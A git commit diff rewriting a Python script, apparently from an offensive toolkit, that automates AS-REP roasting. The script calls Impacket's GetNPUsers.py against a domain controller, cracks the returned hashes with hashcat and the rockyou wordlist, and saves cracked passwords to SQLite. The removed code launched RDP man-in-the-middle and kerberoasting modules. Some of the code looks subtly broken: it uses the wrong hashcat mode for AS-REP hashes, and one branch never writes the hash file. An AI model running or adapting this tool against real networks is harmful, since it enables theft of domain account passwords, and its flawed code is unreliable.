92d8b57ae0ef7ec9063d6d353442d01aed60c7bc
SuzumiyaHaruhi1 <84810190+SuzumiyaHaruhi1@users.noreply.github.com>
2024-06-13 18:04:06 +0300

    Update suzu_asreproasting.py

--- suzu_asreproasting.py
+++ suzu_asreproasting.py
@@ -1,133 +1,188 @@
+import os
 import argparse
 import subprocess
-import sys
+import re
+import sqlite3
 
-def run_kyocera(interface, subnet):
-    subprocess.run(['python3', 'suzu_kyocera.py', '-i', interface, '-s', subnet])
 
-def run_gowitness(interface, subnet):
-    subprocess.run(['python3', 'suzu_gowitness.py', '-i', interface, '-s', subnet])
+class Asreproasting:
+    def __init__(self):
+        self.dc_ip = None
+        self.username = None
+        self.credentials = None
+        self.domain = None
+        self.users_file = None
+        self.nt_hash = None
+        self.wordlist = None
+        self.file_path = 'results/asreproasting/asrep_hashes.txt'
+        self.option = 0
 
-def run_seth(command, interface=None, subnet=None, server=None, ip_address=None):
-    if command == 'mitm':
-        subprocess.run(['python3', 'suzu_seth.py', 'mitm', '-i', interface, '-s', subnet, '-r', server])
-    elif command == 'show':
-        subprocess.run(['python3', 'suzu_seth.py', 'show'])
-    elif command == 'clear':
-        subprocess.run(['python3', 'suzu_seth.py', 'clear'])
-    elif command == 'remove':
-        subprocess.run(['python3', 'suzu_seth.py', 'remove', ip_address])
+    def argument_parser(self):
+        parser = argparse.ArgumentParser(description="Автоматизация выполнения атаки Asreproasting")
 
-def run_kerberoasting(ip, username, credentials, domain, wordlist):
-    subprocess.run(['python3', 'suzu_kerberoasting.py', ip, '-u', username, '-c', credentials, '-d', domain, '-w', wordlist])
+        parser.add_argument("dc_ip", type=str, help="IP-адрес контроллера домена")
+        parser.add_argument("-d", "--domain", type=str, required=True, help="Домен")
+        parser.add_argument("-f", "--usersfile", type=str, help="Файл с пользователями ")
+        parser.add_argument("-u", "--username", type=str, help="Имя пользователя")
+        parser.add_argument("-c", "--credentials", type=str, help="Пароль или NT-hash")
+        parser.add_argument("-w", "--wordlist", type=str, default="/usr/share/wordlists/rockyou.txt",
+                            help="Путь к файлу со словарем")
 
-def run_asreproasting(dc_ip, domain, usersfile=None, username=None, credentials=None, wordlist="/usr/share/wordlists/rockyou.txt"):
-    args = ['python3', 'suzu_asreproasting.py', dc_ip, '-d', domain, '-w', wordlist]
+        args = parser.parse_args()
 
-    if usersfile:
-        args.extend(['-f', usersfile])
-    elif username and credentials:
-        args.extend(['-u', username, '-c', credentials])
+        self.dc_ip = args.dc_ip
+        self.domain = args.domain
+        self.users_file = args.usersfile
+        self.username = args.username
+        self.credentials = args.credentials
+        self.wordlist = args.wordlist
 
-    subprocess.run(args)
+        if self.users_file:
+            if args.username or args.credentials:
+                parser.error("Флаги '-u/--username' и '-c/--credentials' не могут использоваться вместе с '-f/--usersfile'")
+            self.option = 1
+            print(
+                f"IP Address: {self.dc_ip}, Domain: {self.domain}, Users File: {self.users_file}, Wordlist: {self.wordlist}")
+        else:
+            if not args.username or not args.credentials:
+                parser.error(
+                    "Флаги '-u/--username' и '-c/--credentials' нельзя использовать с '-f/--usersfile'")
+            self.option = 2
+            print(
+                f"IP Address: {self.dc_ip}, Domain: {self.domain}, Username: {self.username}, "
+                f"Credentials: {self.credentials}, Wordlist: {self.wordlist}")
+
+    def is_nt_hash(self, credential):
+        # Check if credentials match NT-hash format
+        return bool(re.match(r'^[0-9a-fA-F]{32}$', credential))
+
+    def run_getnpusers(self):
+        try:
+            if self.option == 1:
+                command = [
+                    "GetNPUsers.py",
+                    f"{self.domain}/",
+                    "-dc-ip", self.dc_ip,
+                    "-usersfile", self.users_file,
+                    "-request",
+                    "-outputfile", self.file_path
+                ]
+            else:
+                if self.is_nt_hash(self.credentials):
+                    nt_hash = self.credentials
+                    if not nt_hash.startswith(':'):
+                        nt_hash = f":{nt_hash}"
+                    command = [
+                        "GetNPUsers.py",
+                        f"{self.domain}/{self.username}",
+                        "-dc-ip", self.dc_ip,
+                        "-hashes", nt_hash,
+                    ]
+                else:
+                    command = [
+                        "GetNPUsers.py",
+                        f"{self.domain}/{self.username}:{self.credentials}",
+                        "-dc-ip", self.dc_ip,
+                    ]
+
+            # Execute the command and capture the output
+            result = subprocess.run(command, capture_output=True, text=True, check=True)
+
+            # Print the command output
+            print(result.stdout)
+            if result.stderr:
+                print(result.stderr)
+        except subprocess.CalledProcessError as e:
+            print(f"Error executing GetNPUsers.py: {e}")
+            print(e.output)
+
+    def create_database(self):
+        # Create database and table if they don't exist
+        conn = sqlite3.connect("suzu.db")
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS Asreproasting (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT NOT NULL,
+                password TEXT NOT NULL
+            )
+        ''')
+        conn.commit()
+        conn.close()
+
+    def run_hashcat(self):
+        if not os.path.exists(self.wordlist):
+            print(f"Wordlist file {self.wordlist} does not exist")
+            return
+        elif not os.path.exists(self.file_path):
+            print(f"No hashes found")
+            return
+
+        try:
+            # Run hashcat to crack passwords
+            hashcat_cmd = [
+                "hashcat", "-m", "13100", "-a", "0",
+                self.file_path, self.wordlist
+            ]
+            subprocess.run(hashcat_cmd, check=True)
+
+            # Get passwords from hashcat
+            show_cmd = [
+                "hashcat", "-m", "13100",
+                self.file_path, "--show"
+            ]
+            result = subprocess.run(show_cmd, capture_output=True, text=True, check=True)
+
+            # Process results and save to the database
+            self.save_cracked_hashes(result.stdout)
+
+        except subprocess.CalledProcessError as e:
+            print(f"Error executing hashcat: {e}")
+            print(e.output)
+
+    def save_cracked_hashes(self, output):
+        conn = sqlite3.connect("suzu.db")
+        cursor = conn.cursor()
+
+        for line in output.splitlines():
+            parts = line.split(':')
+            if len(parts) >= 2:
+                hash_info = parts[0]
+                password = parts[1]
+                username = self.extract_username_from_hash(hash_info)
+
+                cursor.execute('''
+                    INSERT INTO Asreproasting (username, password)
+                    VALUES (?, ?)
+                ''', (username, password))
+
+        conn.commit()
+        conn.close()
+
+    def extract_username_from_hash(self, hash_info):
+        # Extract username from hash
+        match = re.search(r'\$([^$]+)\$', hash_info)
+        return match.group(1) if match else "unknown"
+
 
 def main():
-    parser = argparse.ArgumentParser(description='Script for automating available modules')
+    asreproasting = Asreproasting()
 
-    subparsers = parser.add_subparsers(dest='script', help='Choose script to execute')
+    # Parse command line arguments
+    asreproasting.argument_parser()
 
-    # Kyocera parser
-    parser_kyocera = subparsers.add_parser('kyocera', help='Run KYOCERA module')
-    parser_kyocera.add_argument('-i', '--interface', required=True, help='Network interface')
-    parser_kyocera.add_argument('-s', '--subnet', required=True, help='Subnet or single IP to scan')
+    # Create results folder
+    os.makedirs('results/asreproasting', exist_ok=True)
 
-    # GoWitness parser
-    parser_gowitness = subparsers.add_parser('gowitness', help='Run GOWITNESS module')
-    parser_gowitness.add_argument('-i', '--interface', required=True, help='Network interface')
-    parser_gowitness.add_argument('-s', '--subnet', required=True, help='Subnet or single IP to scan')
+    # Create database and table
+    asreproasting.create_database()
 
-    # SETH parser
-    parser_seth = subparsers.add_parser('seth', help='Run SETH module')
-    seth_subparsers = parser_seth.add_subparsers(dest='command', help='Available commands')
+    # Run GetNPUsers.py with provided arguments
+    asreproasting.run_getnpusers()
 
-    mitm_parser = seth_subparsers.add_parser('mitm', help='Run SETH in MITM mode')
-    mitm_parser.add_argument('-i', '--interface', required=True, help="Network interface")
-    mitm_parser.add_argument('-s', '--subnet', required=True, help="Subnet or single IP to listen on")
-    mitm_parser.add_argument('-r', '--server', required=True, help="RDP server")
-
-    seth_subparsers.add_parser('show', help='Show all passwords')
-    seth_subparsers.add_parser('clear', help='Clear the database')
-
-    remove_parser = seth_subparsers.add_parser('remove', help='Remove specific IP address')
-    remove_parser.add_argument('ip', help="IP address to remove")
-
-    # Kerberoasting parser
-    parser_kerberoasting = subparsers.add_parser('kerberoasting', help='Run KERBEROASTING module')
-    parser_kerberoasting.add_argument('ip', help="Domain controller IP address")
-    parser_kerberoasting.add_argument('-u', '--username', required=True, help="Username")
-    parser_kerberoasting.add_argument('-c', '--credentials', required=True, help="Password or NT-hash")
-    parser_kerberoasting.add_argument('-d', '--domain', required=True, help="Domain")
-    parser_kerberoasting.add_argument('-w', '--wordlist', default='/usr/share/wordlists/rockyou.txt', help="Path to wordlist file")
-
-    # Asreproasting parser
-    parser_asreproasting = subparsers.add_parser('asreproasting', help='Run ASREPROASTING module')
-    parser_asreproasting.add_argument('dc_ip', type=str, help="Domain controller IP address")
-    parser_asreproasting.add_argument('-d', '--domain', type=str, required=True, help="Domain")
-    parser_asreproasting.add_argument('-f', '--usersfile', type=str, help="File with users")
-    parser_asreproasting.add_argument('-u', '--username', type=str, help="Username")
-    parser_asreproasting.add_argument('-c', '--credentials', type=str, help="Password or NT-hash")
-    parser_asreproasting.add_argument('-w', '--wordlist', type=str, default="/usr/share/wordlists/rockyou.txt", help="Path to wordlist")
-
-    args = parser.parse_args()
-
-    if len(sys.argv) == 1:
-        parser.print_help(sys.stderr)
-        sys.exit(1)
-
-    if args.script == 'kyocera':
-        if not args.interface or not args.subnet:
-            parser_kyocera.print_help(sys.stderr)
-        else:
-            run_kyocera(args.interface, args.subnet)
-    elif args.script == 'gowitness':
-        if not args.interface or not args.subnet:
-            parser_gowitness.print_help(sys.stderr)
-        else:
-            run_gowitness(args.interface, args.subnet)
-    elif args.script == 'seth':
-        if args.command is None:
-            parser_seth.print_help(sys.stderr)
-        elif args.command == 'mitm':
-            if not args.interface or not args.subnet or not args.server:
-                mitm_parser.print_help(sys.stderr)
-            else:
-                run_seth(args.command, args.interface, args.subnet, args.server)
-        elif args.command == 'show':
-            run_seth(args.command)
-        elif args.command == 'clear':
-            run_seth(args.command)
-        elif args.command == 'remove':
-            if not args.ip:
-                remove_parser.print_help(sys.stderr)
-            else:
-                run_seth(args.command, ip_address=args.ip)
-    elif args.script == 'kerberoasting':
-        if not args.ip or not args.username or not args.credentials or not args.domain:
-            parser_kerberoasting.print_help(sys.stderr)
-        else:
-            run_kerberoasting(args.ip, args.username, args.credentials, args.domain, args.wordlist)
-    elif args.script == 'asreproasting':
-        if args.username or args.credentials:
-            if args.usersfile:
-                parser_asreproasting.error("-f/--usersfile нельзя использовать с -u/--username или -c/--credentials")
-            elif not (args.username and args.credentials):
-                parser_asreproasting.error("-u/--username и -c/--credentials должны быть использованы вместе")
-
-        if not args.dc_ip or not args.domain:
-            parser_asreproasting.print_help(sys.stderr)
-        else:
-            run_asreproasting(args.dc_ip, args.domain, args.usersfile, args.username, args.credentials, args.wordlist)
+    # Run hashcat to crack passwords
+    asreproasting.run_hashcat()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
